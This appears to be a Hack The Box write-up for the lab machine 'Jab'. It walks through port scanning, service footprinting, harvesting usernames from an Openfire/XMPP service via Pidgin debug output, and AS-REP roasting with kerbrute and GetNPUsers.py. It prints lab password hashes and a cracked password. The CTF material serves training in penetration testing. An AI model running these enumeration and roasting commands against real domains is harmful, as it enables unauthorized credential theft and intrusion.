---
title: "HTB Writeup: Jab"
author: xpnt
date: 2024-06-29
image:
  path: https://pbs.twimg.com/media/GHCW-llXkAAIVvV?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,openfire,jabber,xmpp,ASREProasting,pidgin]
---

# Writeup

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/589)

## Enumeration


- The pentester starts with a port scan and discovers that the ports `53,88,135,139,445,464,593,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49664,49665,49666,49667,49673,49682,49683,49684,49689,49838` are open.

```bash
# Nmap 7.94SVN scan initiated Sat May 11 15:13:22 2024 as: nmap -sCV -p53,88,135,139,445,464,593,3268,3269,5222,5223,5262,5263,5269,5270,5275,5276,5985,7070,7443,7777,9389,47001,49664
,49665,49666,49667,49673,49682,49683,49684,49689,49838 -n -Pn -oN scanPorts 10.10.11.4
Nmap scan report for 10.10.11.4
Host is up (0.13s latency).

PORT      STATE SERVICE             VERSION
53/tcp    open  domain              Simple DNS Plus
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2024-05-11 19:13:20Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
|_ssl-date: 2024-05-11T19:14:44+00:00; -9s from scanner time.
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-11T19:14:43+00:00; -9s from scanner time.
| ssl-cert: Subject: commonName=DC01.jab.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.jab.htb
| Not valid before: 2023-11-01T20:16:18
|_Not valid after:  2024-10-31T20:16:18
5222/tcp  open  jabber
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     auth_mechanisms: 
|     stream_id: 6fqe8ft1la
|     features: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|_    compression_methods: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
5223/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     auth_mechanisms: 
|     unknown: 
|     features: 
|     xmpp: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     auth_mechanisms: 
|     stream_id: azyw6mmr13
|     features: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|_    compression_methods: 
5263/tcp  open  ssl/jabber
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     auth_mechanisms: 
|     unknown: 
|     features: 
|     xmpp: 
|     errors: 
|       (timeout)
|_    compression_methods: 
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5269/tcp  open  xmpp                Wildfire XMPP Client
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     auth_mechanisms: 
|     unknown: 
|     features: 
|     xmpp: 
|     errors: 
|       (timeout)
|_    compression_methods: 
5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     unknown: 
|     auth_mechanisms: 
|     stream_id: 4b1ssa2udm
|     features: 
|     xmpp: 
|       version: 1.0
|     errors: 
|       invalid-namespace
|       (timeout)
|_    compression_methods: 
5276/tcp  open  ssl/jabber
| xmpp-info: 
|   STARTTLS Failed
|   info: 
|     capabilities: 
|     auth_mechanisms: 
|     unknown: 
|     features: 
|     xmpp: 
|     errors: 
|       (timeout)
|_    compression_methods: 
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   RPCCheck: 
|_    <stream:error xmlns:stream="http://etherx.jabber.org/streams"><not-well-formed xmlns="urn:ietf:params:xml:ns:xmpp-streams"/></stream:error></stream:stream>
5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7070/tcp  open  realserver?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 May 2024 19:13:20 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 May 2024 19:13:26 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7443/tcp  open  ssl/oracleas-https?
| ssl-cert: Subject: commonName=dc01.jab.htb
| Subject Alternative Name: DNS:dc01.jab.htb, DNS:*.dc01.jab.htb
| Not valid before: 2023-10-26T22:00:12
|_Not valid after:  2028-10-24T22:00:12
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP: 
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 May 2024 19:13:26 GMT
|     Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 223
|     <html>
|     <head><title>Openfire HTTP Binding Service</title></head>
|     <body><font face="Arial, Helvetica"><b>Openfire <a href="http://www.xmpp.org/extensions/xep-0124.html">HTTP Binding</a> Service</b></font></body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 11 May 2024 19:13:33 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help: 
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq: 
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
7777/tcp  open  socks5              (No authentication; connection failed)
| socks-auth-info: 
|_  No authentication
9389/tcp  open  mc-nmf              .NET Message Framing
47001/tcp open  http                Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc               Microsoft Windows RPC
49665/tcp open  msrpc               Microsoft Windows RPC
49666/tcp open  msrpc               Microsoft Windows RPC
49667/tcp open  msrpc               Microsoft Windows RPC
49673/tcp open  msrpc               Microsoft Windows RPC
49682/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc               Microsoft Windows RPC
49684/tcp open  msrpc               Microsoft Windows RPC
49689/tcp open  msrpc               Microsoft Windows RPC
49838/tcp open  msrpc               Microsoft Windows RPC
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5222-TCP:V=7.94SVN%I=7%D=5/11%Time=663FC36D%P=x86_64-pc-linux-gnu%r
SF:(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.or
SF:g/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-str
SF:eams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5263-TCP:V=7.94SVN%T=SSL%I=7%D=5/11%Time=663FC37D%P=x86_64-pc-linux
SF:-gnu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabb
SF:er\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xm
SF:pp-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5276-TCP:V=7.94SVN%T=SSL%I=7%D=5/11%Time=663FC37D%P=x86_64-pc-linux
SF:-gnu%r(RPCCheck,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabb
SF:er\.org/streams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xm
SF:pp-streams\"/></stream:error></stream:stream>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7070-TCP:V=7.94SVN%I=7%D=5/11%Time=663FC359%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20May\x
SF:202024\x2019:13:20\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\x20202
SF:2\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x2
SF:0bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><title>Op
SF:enfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<body><fon
SF:t\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"http://ww
SF:w\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20Service
SF:</b></font></body>\n</html>\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20505\x20U
SF:nknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
SF:ontent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
SF:x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(HTTPOptions,56,
SF:"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2011\x20May\x202024\x2019:13:
SF:26\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RPCCheck,C7,"H
SF:TTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-Type:\
SF:x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConnection:
SF:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\
SF:x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTTP/1\.1
SF:\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20charact
SF:er\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400\x20Il
SF:legal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=is
SF:o-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Ba
SF:d\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x
SF:0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x20URI</
SF:pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20character\x20
SF:CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-L
SF:ength:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</
SF:h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7443-TCP:V=7.94SVN%T=SSL%I=7%D=5/11%Time=663FC35F%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,189,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2011\x2
SF:0May\x202024\x2019:13:26\x20GMT\r\nLast-Modified:\x20Wed,\x2016\x20Feb\
SF:x202022\x2015:55:02\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Rang
SF:es:\x20bytes\r\nContent-Length:\x20223\r\n\r\n<html>\n\x20\x20<head><ti
SF:tle>Openfire\x20HTTP\x20Binding\x20Service</title></head>\n\x20\x20<bod
SF:y><font\x20face=\"Arial,\x20Helvetica\"><b>Openfire\x20<a\x20href=\"htt
SF:p://www\.xmpp\.org/extensions/xep-0124\.html\">HTTP\x20Binding</a>\x20S
SF:ervice</b></font></body>\n</html>\n")%r(HTTPOptions,56,"HTTP/1\.1\x2020
SF:0\x20OK\r\nDate:\x20Sat,\x2011\x20May\x202024\x2019:13:33\x20GMT\r\nAll
SF:ow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x205
SF:05\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20M
SF:essage\x20505</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCCheck
SF:,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent-
SF:Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConne
SF:ction:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Il
SF:legal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HTT
SF:P/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20t
SF:ext/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20
SF:close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20c
SF:haracter\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x20400
SF:\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;char
SF:set=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n
SF:<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20C
SF:NTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x2
SF:0URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-11T19:14:31
|_  start_date: N/A
|_clock-skew: mean: -8s, deviation: 0s, median: -9s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 11 15:14:58 2024 -- 1 IP address (1 host up) scanned in 96.00 seconds
```

- The pentester discovered the domain name `jab.htb` and the DNS computer name `DC01.jab.htb`, and then proceeded to add them to the `/etc/hosts` file.
```bash
echo -ne "10.10.11.4\tjab.htb\tdc01.jab.htb" | sudo tee -a /etc/hosts
```

- **Footprinting DNS**

```bash
dig any jab.htb @10.10.11.4

; <<>> DiG 9.19.21-1-Debian <<>> any jab.htb @10.10.11.4
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9896
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;jab.htb.			IN	ANY

;; ANSWER SECTION:
jab.htb.		600	IN	A	10.10.11.4
jab.htb.		3600	IN	NS	dc01.jab.htb.
jab.htb.		3600	IN	SOA	dc01.jab.htb. hostmaster.jab.htb. 8241 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.jab.htb.		3600	IN	A	10.10.11.4
;; Query time: 120 msec
;; SERVER: 10.10.11.4#53(10.10.11.4) (TCP)
;; WHEN: Sun Jun 09 19:20:01 EDT 2024
;; MSG SIZE  rcvd: 134
```

- **Footprinting SMB**

```bash
crackmapexec smb 10.10.11.4
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)

smbmap -H 10.10.11.4 -u 'not'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)          

rpcclient -N -U '%' 10.10.11.4
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED


smbclient -N -L 10.10.11.4
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.4 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- **Footprinting RPC**

```bash
rpcclient -N -U '%' 10.10.11.4
rpcclient $> srvinfo
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```


- **Footprinting LDAP**

```bash
ldapsearch -b "" -s base namingContexts -H ldap://10.10.11.4 -x
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=jab,DC=htb
namingContexts: CN=Configuration,DC=jab,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=jab,DC=htb
namingContexts: DC=DomainDnsZones,DC=jab,DC=htb
namingContexts: DC=ForestDnsZones,DC=jab,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1



ldapsearch   -H ldap://jab.htb -x -b "DC=jab,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=jab,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CE5, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```


- **Enumeration Kerberos**: Since it's a CTF, it's advisable to use a list like `xato-net-10-million-usernames.txt` to enumerate users with `kerbrute`. This list contains `8,295,455` usernames, so it will take some time. However, if you're patient, it will eventually retrieve the hash derived from the `Session Key` encrypted with the user's secret (`ASRepRoast Attack`) for users who lack Kerberos pre-authentication.

>Tip:
>It's worth noting that the `kerbrute` tool has been updated since November 15, 2020, and now automatically captures ASREP hashes, as mentioned in this [commit](https://github.com/ropnop/kerbrute/commit/bc1d606c75c26b2c7448b7025593cb951dfe46bd) and documented in this [issue](https://github.com/ropnop/kerbrute/issues/24).
{: .prompt-tip }

```bash
kerbrute userenum -d JAB.HTB --dc 10.10.11.4 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

- After enumerating services such as `SMB`, `LDAP`, `Kerberos`, `RPC`, and `DNS`, the pentester noticed unusual services on the Domain Controller: `XMPP` and `Jabber`. A quick search helped him identify that Jabber and XMPP are essentially the same protocol. The only distinction lies in the fact that **Jabber is a trademarked term while XMPP serves as the protocol's official designation**.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613080229.png)

- Jabber, as well as XMPP, provides a foundational framework for instant messaging, presence information, and contact list maintenance over the internet ([source](https://www.jpl.nasa.gov/edu/pdfs/jabber-intro-brochure.pdf)). Since it's a messaging application, there's likely interesting information to investigate. That's why the pentester needed a client to connect to the Jabber service. There are various client applications available ([source](https://jabber.at/clients/?os=linux)) depending on the operating system. Since the pentester's attack box runs on Linux, he used `Pidgin` as the client.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613081453.png)

- After installing `Pidgin`, the pentester was able to view 2 available rooms for their newly created user (`xpnt`). However, upon reviewing them, he didn't find anything interesting.

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613141751.png)

> Comments:
>If you encounter any issues with the installation, you can refer to this [excellent guide](https://ed.fnal.gov/lincon/act/tech/pidgin/), although it may be outdated, for installing Pidgin and configuring the relevant Jabber service.
{: .prompt-info }

- Since at this point `kerbrute` was still enumerating users, the pentester decided to explore if there was any way to obtain a user list. After some searching, he found a method; however, the panel he discovered didn't allow exporting or copying the list. A detailed explanation of the process can be found [here](https://issues.imfreedom.org/issue/PIDGIN-7357/Add-user-search-for-user-enhancement#focus=Comments-4-42520.0-0).

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609200635.png)

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609200708.png)

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609200456.png)


- However, it's possible to use the `-d` option of `Pidgin`, which prints debugging messages to stdout. The pentester can then capture these messages and store them in a file named `info_debug.txt` for further processing.

```bash
pidgin -d 2>&1 >  info_debug.txt 
```

- To obtain a list of users, we will filter the content of the `info_debug.txt` file for email addresses and store them in the `users_jabber.txt` file.

 ```bash
cat info_debug.txt | grep -oP "(\w*@jab\.htb)" | sed 's/@jab.htb//g' | sort -u | sponge users_jabber.txt
```

 - With this list of users from the Jabber service, likely more relevant than a generic list like `xato-net-10-million-usernames.txt`, we can perform an ASREPRoast Attack using tools like `kerbrute` or `GetNPUsers.py`. This resulted in finding 3 ASREP hashes.

```bash
kerbrute userenum -d JAB.HTB --dc 10.10.11.4 users_jabber.txt

GetNPUsers.py JAB.HTB/ -dc-ip 10.10.11.4 -no-pass -usersfile users_jabber.txt
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<SNIP>
$krb5asrep$23$jmontgomery@JAB.HTB:82ac20f345a89bdd37a8b3c71e16de81$a8ffc1145e6ad780a4457665cd3cc41c4a834fbdf230da473aa5e9ac71f33164aa2483c5a1738769623a6d7da8b4a37c4e7343b66541393de737e25a5531e303515412d7c83cf51f84c618f644a3ae49aba58890dceda272b21fa2f11eaea54c470cfd2a6634c79aef2a251a4c4f5d5c6d9250815f5f73e4093743ad41dce1f467d40c294478727fb7cd8a4d14506e366b0de452c9b27aebf513b05da6665909f82d6501b5fed2eefefdbdec1949167f2f3d962bb22c8ab0b5e00295f1cc0994e0e0e414511c56b32889187652837d951cd6d10061ff21b26b6734f81b7038f010b1
$krb5asrep$23$lbradford@JAB.HTB:f6f16bd0744d399da85720c775bbba95$13d6f41b9734f5ac2d39f58e1b03c9c4fc267e0f2e69c4ad321bd3047153e48acd3173d72de6443b25a4e9c2832aef263d0de61afbc9090da09e0e574227b514cdb2cdf7af74ab8ee21f0fc9032950b5630b7d397340b86b90ed9cb906a82d0bb88f8af94e8a53d4169a973cc7ca309a2c5827f580252bfc72ae71a5233e8c7d3142b55b16a1c2e740853fc9b12b30de7bbb01dc94daf18c5c5e91c7cda72674c42722f1b8ac4997ca3b826ddab0440621bc29e1116b4a1a93e37e7ff6f911680115ebcf3f5fb462eb7af90fdad60b6c85c6f01dc2d54b80f52bbd6ed5f8f74a0d09
$krb5asrep$23$mlowe@JAB.HTB:b0df8e7e87f6f9c24c80c5ba42050cca$eacde3a312aacee6ccec460158d603ced69cd8132017e7f90d25a925d0f7c043fa4a3d091328608b5e1806c6f1fe8ce86f6f5de29e77a359723999b484578ee1ea2f09721dfabeaa1d4be1831f02896831783d434d41b57035e5573333431e4e5b7263f8a350eb0a80e0d22956bfc4bd4314a46f5e82a572eafa2a486e205530dade262881b2903b5db24a35ef8f7d1069681f43835412ef94cd99c4062d663e9bca37258648977aae960171a278b12efb7a1189c01933cab472843b4d3735f6f53ecb7c1c273f021d991043cef0f7415e9a0a5f00d1d6d87053ec404b0b8fb5baf4

```
 
 - Afterward, using `Hashcat`, he managed to crack them, uncovering the credentials for the user `jmontgomery`: `Midnight_121`.
 
 ![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609203915.png)

- With these credentials and utilizing the `crackmapexec` tool, the pentester conducted a search for interesting shares on the SMB service and attempted access via the WinRM service, but without success.

```bash
crackmapexec smb 10.10.11.4 -u 'jmontgomery' -p Midnight_121 --shares
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613094217.png)

```bash
crackmapexec winrm 10.10.11.4 -u 'jmontgomery' -p Midnight_121
```

![](/assets/images/HTB-Writeup-Jab/Pasted image 20240613094202.png)

- However, when attempting to access the Jabber service with these credentials, the pentester discovered that he now had access to a new room called `pentest2003`.

 ![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609204529.png)
 ![](/assets/images/HTB-Writeup-Jab/Pasted image 20240609204611.png)
